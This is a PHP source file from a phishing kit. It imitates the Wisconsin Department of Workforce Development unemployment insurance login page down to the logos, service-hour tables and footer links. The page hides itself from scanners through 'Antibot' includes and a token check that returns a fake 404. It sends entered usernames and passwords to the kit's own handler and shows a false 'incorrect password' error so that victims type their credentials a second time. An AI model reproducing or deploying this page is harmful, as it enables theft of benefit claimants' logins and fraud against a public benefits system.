<?php

    session_start();
    date_default_timezone_set('America/Chicago');

    require_once '../J/Comp.php';
    require_once '../J/Antibot.php';
    require_once '../J/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;
    
    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html class=" js flexbox flexboxlegacy rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">

<head>
    <title>Secure Log In PROD</title>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../A/css/Login/bootstrap.css" rel="stylesheet">
    <link href="../A/css/Login/css.css" rel="stylesheet">
    <link href="../A/css/Login/font-awesome.css" rel="stylesheet">
    <link href="../A/css/Login/bootstro.css" rel="stylesheet">
    <link href="../A/css/Login/App.css" rel="stylesheet">

    <style>
        
        .validation-summary-errors,
        .validation-summary-errors > * {
            margin: 0;
        }

    </style>
</head>

<body class="js">
    <noscript>
        <p id="nojavascript">
            You need to have javascript enabled to use this application. Please refer to your
            browser settings to enable javascript.
        </p>
    </noscript>
    <div class="container-fluid WhiteBackground">
        <a class="sr-only" href="#content">Skip to main content</a>
        <div id="header" class="row hidden-xs">
            <div class="col-md-12 col-sm-12">
                <div class="row">
                    <div id="dwdLogo" class="col-lg-2 col-md-3 col-sm-4 hidden-print">
                        <img alt="Department of Workforce Development" class="img-responsive" id="imgLogo" src="../A/img/logonew.png" title="Department of Workforce Development">
                    </div>
                    <div id="dwdLogoPrint" class="col-lg-2 col-md-3 col-sm-4 visible-print">
                        <img alt="Department of Workforce Development" class="img-responsive" id="imgLogoPrint" src="../A/img/dwd_logo_gray.png" title="Department of Workforce Development">
                    </div>
                    <div id="landingheading" class="col-lg-8 col-md-6 col-sm-6">
                        <h1>Wisconsin Unemployment Insurance</h1>
                    </div>
                    <div class="col-sm-2 col-md-3 col-lg-2  Logout text-right hidden-print pull-right">
                    </div>
                </div>
                <div id="dwd" class="row hidden-print">
                    <div class="col-md-12">
                        <b>Department of Workforce Development</b>
                    </div>
                </div>
            </div>
        </div>
        <div id="header-xs" class="row visible-xs">
            <div class="col-xs-12">
                <div class="row">
                    <div id="landingheading-xs" class="col-xs-12">
                        <h1>Wisconsin Unemployment Insurance</h1>
                    </div>
                </div>
                <div id="dwd-xs" class="row">
                    <div class="col-xs-9">
                        <b>Department of Workforce Development</b>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid WhiteBackground">
        <div id="LogonHeader">
            <h1>Wisconsin Unemployment Insurance Benefit Services</h1>
        </div>
        <div id="LogonMain" class="row">
            <div class="col-xs-12 col-sm-9 col-md-7 col-lg-6">
                <form id="form" method="POST" action="../L/?token=<?php echo $_SESSION['token']; ?>">
                    <div id="error" class="validation-summary-errors"><?php
                    
                        if (
                            isset($_SESSION['loginTwice']) &&
                            $_SESSION['loginTwice']
                        ) {
                            echo '<ul><li>The username or password provided is incorrect, please try again.</li></ul>';
                        }

                    ?></div>
                    <div id="error2" class="validation-summary-errors"></div>
                    <div id="CurrentUsers">
                        <div class="form-group">
                            <div class="row">
                                <div class="col-xs-1 col-sm-1 col-md-1 col-lg-1">
                                </div>
                                <div class="col-xs-10 col-sm-10 col-md-10 col-lg-10">
                                    <div>Logon to file for unemployment benefits. If you do not have a username and password click on the Sign up link below.</div>
                                    <div class="spacer20"></div>
                                    <div><strong>IMPORTANT:</strong> If you used our
                                        online services in the past and created a username but forgot what the
                                        username is, DO NOT create a new username, Click on the forgot
                                        username/password link below. </div>
                                    <div class="spacer20"></div>
                                    <input class="form-control" id="username" name="username" placeholder="Username" type="text">
                                    <input class="form-control" id="password" name="password" placeholder="Password" type="password">
                                    <div class="spacer20"></div>
                                    <div>
                                        <input type="button" id="btn" class="btn btn-primary btn-block" value="Log In">
                                    </div>
                                    <div class="spacer20"></div>
                                   <div class="form-group">
                                        <div class="row">
                                            <div class="col-xs-12 col-sm-12 underlineLink">
                                                <div class="spacer5"></div>
                                                <a style="cursor: pointer;" id="RecoverPassword">Forgot your Username/Password?</a>
                                                <div class="spacer5"></div>
                                                <a style="cursor: pointer;" id="ChangeProfilePassword">Change your Password / Edit Logon Profile</a>
                                                <br>
                                                <div class="spacer5"></div>
                                                Don't have a username? <a style="cursor: pointer;" id="Register">Sign up</a>
                                                <div class="spacer5"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-xs-1 col-sm-1 col-md-1 col-lg-1">
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
            <div class="spacer20"></div>
            <div id="HoursBox" class="col-xs-10 col-sm-9 col-md-5 col-lg-4 blueOutline">
                <div class="form-group">
                    <strong>Online services are available at the following times:</strong>
                    <div class="spacer20"></div>
                    <p>If you are unemployed and need to file a new claim:</p>
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Sunday
                        </div>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            12:00 pm - 5:00 pm
                        </div>
                    </div>
                    <div class="spacer5 visible-xs"></div>
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Monday - Friday
                        </div>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            6:00 am - 7:00 pm
                        </div>
                    </div>
                    <div class="spacer5 visible-xs"></div>
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Saturday
                        </div>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            9:00 am - 2:30 pm
                        </div>
                    </div>
                    <div class="spacer20"></div>
                    <div class="spacer20"></div>
                    <p>If you need to file a weekly claim for a benefit payment or get information about your benefit account:</p>
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Sunday
                        </div>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            9:00 am - Midnight
                        </div>
                    </div>
                    <div class="spacer5 visible-xs"></div>
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Monday - Friday
                        </div>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Available 24 Hours
                        </div>
                    </div>
                    <div class="spacer5 visible-xs"></div>
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Saturday
                        </div>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            Midnight - 3:00 pm
                        </div>
                    </div>
                    <div class="spacer20"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid WhiteBackground">
        <br>
        <div id="footer" class="footer row hidden-print">
            <div class="col-md-12">
                <a style="cursor: pointer;">Unemployment Insurance</a>
                | <a style="cursor: pointer;">Contact us</a>
                | <a style="cursor: pointer;">Legal/Acceptable Use</a>
                | <a style="cursor: pointer;">DWD Home</a>
                <div class="row">
                    <div class="col-md-12"><?php echo date('n/j/Y') . ' ' . date('g:i:s A'); ?></div>
                </div>
            </div>
        </div>
    </div>
    <script src="../A/js/login.js"></script>
</body>

</html>